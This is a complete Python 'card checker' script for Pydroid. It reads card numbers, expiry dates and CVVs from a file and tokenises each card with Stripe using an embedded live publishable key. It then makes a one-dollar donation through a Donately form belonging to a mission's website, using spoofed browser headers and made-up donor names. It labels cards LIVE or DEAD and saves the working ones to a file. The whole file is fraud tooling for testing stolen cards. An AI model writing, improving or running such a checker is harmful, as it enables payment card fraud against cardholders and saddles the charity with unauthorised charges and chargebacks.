"""
Card Checker for Pydroid
Reads cards from a text file and checks them using Stripe/Donately gateway
Card format in txt file: cc|mm|yy|cvv (one card per line)
"""

import requests
import json
import random
import string
import hashlib
import time
import os
from datetime import datetime


class StripeChecker:
    def __init__(self):
        self.pk_live = 'pk_live_51MJjGSR9GTt0CcXJYNHenVaATXNyK43YPRgUBgoRQDtrLCnk7YZ8OL7uhrQF3BJAs8vT8dPoKjORWC9JlwSwRiKs00QjcCzQMX'
        self.account_id = 'act_f9b102ae7299'
        self.form_id = 'frm_5cb29a5d6955'
        self.session = requests.Session()
        
        # Statistics
        self.total = 0
        self.live = 0
        self.dead = 0
        self.errors = 0

    def generate_guid(self):
        return '-'.join([
            ''.join(random.choices(string.hexdigits[:16], k=4) for _ in range(3)),
            ''.join(random.choices(string.hexdigits[:16], k=3)) + '4',
            ''.join(random.choices(string.hexdigits[:16], k=3)) + 'a',
            ''.join(random.choices(string.hexdigits[:16], k=4) for _ in range(2))
        ])

    def generate_random_user(self):
        first_names = ['James', 'John', 'Robert', 'Michael', 'William', 'David', 'Richard', 'Joseph', 'Thomas', 'Charles']
        last_names = ['Smith', 'Johnson', 'Williams', 'Brown', 'Jones', 'Garcia', 'Miller', 'Davis', 'Rodriguez', 'Martinez']
        
        return {
            'first_name': random.choice(first_names),
            'last_name': random.choice(last_names),
            'email': f'{random.choice(first_names).lower()}{random.randint(100, 9999)}@gmail.com'
        }

    def generate_token(self, card_data):
        url = 'https://api.stripe.com/v1/tokens'
        headers = {
            'Accept': 'application/json',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Origin': 'https://js.stripe.com',
            'Referer': 'https://js.stripe.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        post_fields = {
            'card[number]': card_data['cc'],
            'card[cvc]': card_data['cvv'],
            'card[exp_month]': card_data['month'],
            'card[exp_year]': card_data['year'],
            'card[name]': card_data['name'],
            'card[address_country]': 'US',
            'card[currency]': 'USD',
            'guid': self.generate_guid(),
            'muid': self.generate_guid(),
            'sid': self.generate_guid(),
            'payment_user_agent': 'stripe.js/d72854d2f1; stripe-js-v3/d72854d2f1; card-element',
            'time_on_page': random.randint(20000, 50000),
            'key': self.pk_live,
            '_stripe_version': '2022-11-15'
        }

        try:
            response = self.session.post(url, headers=headers, data=post_fields, timeout=30)
            return response.json()
        except Exception as e:
            return {'error': {'message': str(e)}}

    def charge_card(self, token, user_data):
        url = f"https://api.donately.com/v2/donations?account_id={self.account_id}&donation_type=cc&amount_in_cents=100&form_id={self.form_id}&x1={hashlib.md5(str(time.time()).encode()).hexdigest()}"
        headers = {
            'Accept': '*/*',
            'Content-Type': 'application/json; charset=UTF-8',
            'Donately-Version': '2022-12-15',
            'Origin': 'https://www-christwaymission-com.filesusr.com',
            'Referer': 'https://www-christwaymission-com.filesusr.com/',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        }
        payload = {
            'campaign_id': None,
            'fundraiser_id': None,
            'dont_send_receipt_email': False,
            'first_name': user_data['first_name'],
            'last_name': user_data['last_name'],
            'email': user_data['email'],
            'currency': 'USD',
            'recurring': False,
            'country': 'US',
            'payment_auth': json.dumps({'stripe_token': token}),
            'form': json.dumps({
                'version': '5.8.117',
                'id': self.form_id
            })
        }

        try:
            response = self.session.post(url, headers=headers, json=payload, timeout=30)
            return response.json()
        except Exception as e:
            return {'error': str(e)}

    def get_status(self, response):
        """Determine card status from response"""
        response_str = json.dumps(response).lower()
        
        # Check for live/charged indicators
        if any(keyword in response_str for keyword in ['succeeded', 'success', 'thank you', 'approved', 'paid']):
            return 'LIVE', 'Charged/Approved'
        
        # Check for CVV issues (card exists but CVV wrong)
        if any(keyword in response_str for keyword in ['incorrect_cvc', 'invalid_cvc', 'cvc_check', 'security code']):
            return 'CCN', 'CVV Issue - Card Valid'
        
        # Check for insufficient funds (card is live)
        if 'insufficient_funds' in response_str:
            return 'LIVE', 'Insufficient Funds'
        
        # Check for 3D secure (card is live)
        if any(keyword in response_str for keyword in ['3d_secure', 'authentication_required', '3ds']):
            return 'LIVE', '3D Secure Required'
        
        # Check for card declined
        if any(keyword in response_str for keyword in ['declined', 'card_declined', 'do_not_honor']):
            return 'DEAD', 'Card Declined'
        
        # Check for invalid card
        if any(keyword in response_str for keyword in ['invalid_card', 'invalid_number', 'incorrect_number', 'expired']):
            return 'DEAD', 'Invalid Card'
        
        # Check for error messages
        if 'error' in response_str:
            error_msg = response.get('error', {})
            if isinstance(error_msg, dict):
                return 'DEAD', error_msg.get('message', 'Unknown Error')
            return 'DEAD', str(error_msg)
        
        return 'UNKNOWN', 'Unknown Response'

    def process_card(self, card_line):
        """Process a single card line in format: cc|mm|yy|cvv"""
        try:
            parts = card_line.strip().split('|')
            if len(parts) < 4:
                return None, 'Invalid Format', 'Card format should be: cc|mm|yy|cvv'
            
            cc, month, year, cvv = parts[0], parts[1], parts[2], parts[3]
            
            # Normalize year
            if len(year) == 4:
                year = year[2:]
            
            user_data = self.generate_random_user()
            
            # Step 1: Generate Stripe token
            token_response = self.generate_token({
                'cc': cc,
                'month': month,
                'year': year,
                'cvv': cvv,
                'name': f"{user_data['first_name']} {user_data['last_name']}"
            })
            
            if 'error' in token_response:
                error_msg = token_response.get('error', {})
                if isinstance(error_msg, dict):
                    return 'DEAD', 'Token Failed', error_msg.get('message', 'Unknown')
                return 'DEAD', 'Token Failed', str(error_msg)
            
            if 'id' not in token_response:
                return 'DEAD', 'Token Failed', 'No token ID received'
            
            # Step 2: Charge the card
            charge_response = self.charge_card(token_response['id'], user_data)
            
            status, message = self.get_status(charge_response)
            return status, message, charge_response
            
        except Exception as e:
            return 'ERROR', 'Exception', str(e)


def read_cards_from_file(filename):
    """Read cards from text file"""
    cards = []
    try:
        with open(filename, 'r', encoding='utf-8') as f:
            for line in f:
                line = line.strip()
                # Skip empty lines and comments
                if line and '|' in line and not line.startswith('#'):
                    cards.append(line)
    except FileNotFoundError:
        print(f"[ERROR] File not found: {filename}")
        return []
    except Exception as e:
        print(f"[ERROR] Could not read file: {e}")
        return []
    return cards


def save_results(live_cards, dead_cards, output_dir='results'):
    """Save results to separate files"""
    os.makedirs(output_dir, exist_ok=True)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
    if live_cards:
        live_file = os.path.join(output_dir, f'live_{timestamp}.txt')
        with open(live_file, 'w') as f:
            for card, msg in live_cards:
                f.write(f"{card} | {msg}\n")
        print(f"[+] Live cards saved to: {live_file}")
    
    if dead_cards:
        dead_file = os.path.join(output_dir, f'dead_{timestamp}.txt')
        with open(dead_file, 'w') as f:
            for card, msg in dead_cards:
                f.write(f"{card} | {msg}\n")
        print(f"[+] Dead cards saved to: {dead_file}")


def print_banner():
    """Print application banner"""
    banner = """
╔══════════════════════════════════════════════════╗
║           PYDROID CARD CHECKER v1.0              ║
║              Stripe/Donately Gate                ║
╠══════════════════════════════════════════════════╣
║  Card Format: cc|mm|yy|cvv                       ║
║  Example: 4111111111111111|12|25|123             ║
╚══════════════════════════════════════════════════╝
    """
    print(banner)


def main():
    print_banner()
    
    # Default file name - change this or pass as input
    print("\n[?] Enter cards file path (default: cards.txt): ", end='')
    try:
        input_file = input().strip()
        if not input_file:
            input_file = 'cards.txt'
    except:
        input_file = 'cards.txt'
    
    print(f"\n[*] Loading cards from: {input_file}")
    cards = read_cards_from_file(input_file)
    
    if not cards:
        print("[!] No cards found in file. Please check the file path and format.")
        print("[!] Expected format: cc|mm|yy|cvv (one per line)")
        return
    
    print(f"[*] Loaded {len(cards)} cards")
    print("[*] Starting checker...\n")
    print("=" * 60)
    
    checker = StripeChecker()
    
    live_cards = []
    dead_cards = []
    
    for i, card in enumerate(cards, 1):
        print(f"\n[{i}/{len(cards)}] Checking: {card}")
        
        start_time = time.time()
        status, message, response = checker.process_card(card)
        elapsed = round(time.time() - start_time, 2)
        
        if status == 'LIVE' or status == 'CCN':
            checker.live += 1
            live_cards.append((card, message))
            status_icon = '[LIVE]' if status == 'LIVE' else '[CCN]'
            print(f"  {status_icon} {message} | Time: {elapsed}s")
        elif status == 'ERROR':
            checker.errors += 1
            dead_cards.append((card, f"ERROR: {message}"))
            print(f"  [ERROR] {message} | Time: {elapsed}s")
        else:
            checker.dead += 1
            dead_cards.append((card, message))
            print(f"  [DEAD] {message} | Time: {elapsed}s")
        
        checker.total += 1
        
        # Small delay to avoid rate limiting
        time.sleep(random.uniform(1, 2))
    
    print("\n" + "=" * 60)
    print("\n[*] RESULTS SUMMARY")
    print("=" * 60)
    print(f"  Total Checked: {checker.total}")
    print(f"  Live/CCN:      {checker.live}")
    print(f"  Dead:          {checker.dead}")
    print(f"  Errors:        {checker.errors}")
    print("=" * 60)
    
    # Save results
    save_results(live_cards, dead_cards)
    
    print("\n[*] Checker completed!")


if __name__ == "__main__":
    main()
